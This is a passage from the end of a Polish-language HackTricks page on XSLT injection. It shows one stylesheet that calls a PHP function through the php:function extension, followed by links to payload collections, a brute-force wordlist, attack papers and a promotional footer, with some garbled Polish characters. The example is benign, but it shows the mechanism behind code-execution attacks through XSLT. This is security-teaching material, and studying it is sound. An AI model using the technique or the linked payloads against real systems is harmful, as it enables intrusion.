<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"
version="1.0">
<xsl:output method="html" version="XHTML 1.0" encoding="UTF-8" indent="yes" />
<xsl:template match="root">
<html>
<!-- We use the php suffix to call the static class function stringToUrl() -->
<xsl:value-of select="php:function('XSL::stringToUrl','une_superstring-|modifier')" />
<!-- Output: 'une_superstring ao modifier' -->
</html>
</xsl:template>
</xsl:stylesheet>
```
(Przykad z [http://laurent.bientz.com/Blog/Entry/Item/using\_php\_functions\_in\_xsl-7.sls](http://laurent.bientz.com/Blog/Entry/Item/using\_php\_functions\_in\_xsl-7.sls))

## Wicej Payload贸w
* Sprawd藕 [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection)
* Sprawd藕 [https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt_injection](https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt_injection)

## **Lista wykrywania Brute-Force**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xslt.txt" %}

## **Referencje**

* [XSLT\_SSRF](https://feelsec.info/wp-content/uploads/2018/11/XSLT\_SSRF.pdf)\\
* [http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20IO%20Active.pdf](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20IO%20Active.pdf)\\
* [http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20Blackhat%202015.pdf](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20Blackhat%202015.pdf)

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie zajmujcej si cyberbezpieczestwem**? Chcesz zobaczy **reklam swojej firmy w HackTricks**? A mo偶e chcesz mie dostp do **najnowszej wersji PEASS lub pobra HackTricks w formacie PDF**? Sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Docz do** [****](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** mnie na **Twitterze** [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do repozytorium [hacktricks](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
